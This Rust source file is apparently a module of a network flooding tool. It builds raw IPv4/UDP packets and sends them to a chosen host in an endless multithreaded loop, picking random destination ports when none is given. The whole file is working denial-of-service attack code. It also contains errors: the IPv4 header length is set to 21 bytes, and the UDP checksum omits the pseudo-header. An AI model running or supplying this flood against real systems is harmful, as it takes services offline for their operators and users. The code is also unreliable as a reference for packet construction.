use std::net::Ipv4Addr;
use std::sync::{Arc, Mutex};
use std::thread::JoinHandle;
use std::time::Duration;

use anyhow::Result;

use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::udp::MutableUdpPacket;
use pnet::packet::MutablePacket;
use pnet::transport::TransportChannelType::Layer3;
use pnet::transport::{transport_channel, TransportSender};

use pnet::util;
use rand::Rng;

use crate::cli::UdpArgs;
use crate::flood::Flood;
use crate::ip;

const IPV4_HEADER_LEN: usize = 21;
const UDP_HEADER_LEN: usize = 8;

pub struct UdpFlood {
  tx: Arc<Mutex<TransportSender>>,
  delay: u64,
  args: UdpArgs,
  src_port: u16,
}

impl UdpFlood {
  pub fn init(args: UdpArgs, delay: u64) -> Result<Self> {
    println!("UDP flood");
    println!("Payloading {}-byte packets", args.size);

    let (tx, _) = transport_channel(2 << 15, Layer3(IpNextHeaderProtocols::Udp)).unwrap();
    Ok(Self {
      tx: Arc::new(Mutex::new(tx)),
      delay,
      args,
      src_port: rand::thread_rng().gen_range(49152..=65535),
    })
  }

  fn flood(
    tx: Arc<Mutex<TransportSender>>,
    addr: Ipv4Addr,
    src_port: u16,
    dest_port: Option<u16>,
    size: usize,
    delay: u64,
  ) {
    let mut buffer_udp = vec![0u8; size + UDP_HEADER_LEN];
    let mut buffer_ip = vec![0u8; buffer_udp.len() + IPV4_HEADER_LEN];
    let mut rng = rand::thread_rng();
    loop {
      let dest_port = dest_port.unwrap_or(rng.gen_range(1..49152));
      let packet = create_udp_packet(&mut buffer_ip, &mut buffer_udp, addr, src_port, dest_port);
      let mut tx = tx.lock().unwrap();
      if let Err(err) = tx.send_to(packet, std::net::IpAddr::V4(addr)) {
        panic!("{err}");
      }
      std::thread::sleep(Duration::from_micros(delay))
    }
  }
}

impl Flood for UdpFlood {
  fn start(&self, threads: usize) -> Vec<JoinHandle<()>> {
    if threads > 1 {
      println!("Spawning {} threads", threads);
    }
    (0..threads)
      .map(|_| {
        let tx = self.tx.clone();
        let addr = self.args.host;
        let size = self.args.size;
        let delay = self.delay;
        let src_port = self.src_port;
        let dest_port = self.args.port;
        std::thread::spawn(move || UdpFlood::flood(tx, addr, src_port, dest_port, size, delay))
      })
      .collect()
  }
}

fn create_udp_packet<'a>(
  buffer_ip: &'a mut [u8],
  buffer_udp: &'a mut [u8],
  dest: Ipv4Addr,
  src_port: u16,
  dest_port: u16,
) -> MutableIpv4Packet<'a> {
  let udp_size = buffer_udp.len();
  let mut ipv4_packet = ip::create_ipv4_packet(buffer_ip, dest, IpNextHeaderProtocols::Udp, udp_size);

  let mut udp_packet = MutableUdpPacket::new(buffer_udp).expect("Error creating udp packet");
  udp_packet.set_source(src_port);
  udp_packet.set_destination(dest_port);
  udp_packet.set_length(udp_size as u16);
  let checksum = util::checksum(udp_packet.packet_mut(), 1);
  udp_packet.set_checksum(checksum);

  ipv4_packet.set_payload(dbg!(udp_packet).packet_mut());
  ipv4_packet
}
